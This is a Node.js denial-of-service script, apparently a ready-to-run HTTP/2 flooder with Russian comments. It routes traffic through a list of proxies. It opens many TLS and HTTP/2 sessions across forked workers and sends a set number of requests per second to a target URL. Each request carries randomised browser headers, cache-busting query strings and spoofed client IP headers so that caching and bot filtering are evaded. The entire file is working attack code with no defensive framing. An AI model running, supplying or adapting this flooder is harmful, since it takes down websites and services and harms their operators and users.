const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) { });

if (process.argv.length < 7){console.log(`writen by @assembly3: node tls-c.js target time rate thread proxyfile`); process.exit();}

// =========== НАБОРЫ РАНДОМНЫХ ЗНАЧЕНИЙ ===========
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];

const cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
];

const encoding_header = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
];

const fetch_site = [
    "same-origin",
    "same-site", 
    "cross-site",
    "none"
];

const fetch_mode = [
    "navigate",
    "same-origin",
    "no-cors",
    "cors"
];

const fetch_dest = [
    "document",
    "sharedworker",
    "subresource",
    "unknown",
    "worker"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0 Safari/537.36",
];

// =========== ФУНКЦИИ ===========
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// =========== СЛУЧАЙНЫЕ ЗНАЧЕНИЯ NEL ===========
function generateNEL() {
    const options = [
        {report_to: "cf-nel", "max-age": 604800, include_subdomains: true},
        {report_to: "cf-nel", "max-age": 86400, include_subdomains: false},
        {report_to: "default", "max-age": 604800, include_subdomains: true},
        {report_to: "default", "max-age": 2592000, include_subdomains: false},
        {report_to: "network-errors", "max-age": 604800, include_subdomains: true},
        {report_to: "network-errors", "max-age": 86400, include_subdomains: false},
    ];
    return JSON.stringify(randomElement(options));
}

// =========== АРГУМЕНТЫ ===========
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Header = new NetSocket();

// =========== ГЕНЕРАЦИЯ ДИНАМИЧЕСКИХ ЗАГОЛОВКОВ ===========
function generateDynamicHeaders() {
    const referers = [
        `https://www.google.com/search?q=${randstr(10)}`,
        `https://www.bing.com/search?q=${randstr(8)}`,
        `https://www.yahoo.com/news/${randstr(5)}`,
        `https://www.reddit.com/r/${randstr(6)}`,
        `https://twitter.com/${randstr(7)}`,
        `https://www.facebook.com/${randstr(8)}`,
        `https://www.youtube.com/watch?v=${randstr(11)}`,
        `https://www.amazon.com/s?k=${randstr(9)}`,
        `https://${randstr(10)}.com/${randstr(5)}`,
        `https://${randstr(8)}.org/${randstr(6)}`,
    ];

    const origin = Math.random() > 0.7 ? `https://${parsedTarget.host}` : randomElement(referers).split('/').slice(0,3).join('/');
    
    return {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(10),
        "accept": randomElement(accept_header),
        "accept-encoding": randomElement(encoding_header),
        "accept-language": randomElement(language_header),
        "cache-control": randomElement(cache_header),
        "upgrade-insecure-requests": "1",
        "te": "trailers",
        "user-agent": randomElement(useragents),
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-mode": randomElement(fetch_mode),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-user": Math.random() > 0.5 ? "?1" : "?0",
        "nel": generateNEL(),
        "pragma": "no-cache",
        "referer": randomElement(referers),
        "origin": origin,
        "x-forwarded-for": `${randomIntn(1,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}`,
        "x-real-ip": `${randomIntn(1,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}`,
        "x-client-ip": `${randomIntn(1,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}.${randomIntn(0,255)}`,
        "x-forwarded-proto": "https",
        "x-forwarded-port": "443",
        "x-requested-with": Math.random() > 0.5 ? "XMLHttpRequest" : "",
        "x-csrf-token": crypto.randomBytes(16).toString('hex'),
        "dnt": Math.random() > 0.5 ? "1" : "0",
        "save-data": Math.random() > 0.8 ? "on" : "",
        "priority": randomElement(["u=0", "u=1", "i"]),
        "viewport-width": randomElement(["1920", "1366", "1536", "1440", "1280"]),
        "sec-ch-ua": `"Chromium";v="128", "Google Chrome";v="128", "Not=A?Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() > 0.5 ? "?0" : "?1",
        "sec-ch-ua-platform": randomElement(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
        "x-device-type": randomElement(["desktop", "mobile", "tablet"]),
        "x-browser": randomElement(["chrome", "firefox", "edge", "safari"]),
        "x-os": randomElement(["windows", "macos", "linux", "android", "ios"]),
        "x-page-load": randomElement(["1", "0"]),
        "x-ajax": Math.random() > 0.5 ? "true" : "false",
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            socket: connection,
            port: 443,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynamicHeaders = generateDynamicHeaders();
                    const request = client.request(dynamicHeaders)
                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return;
                        });
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);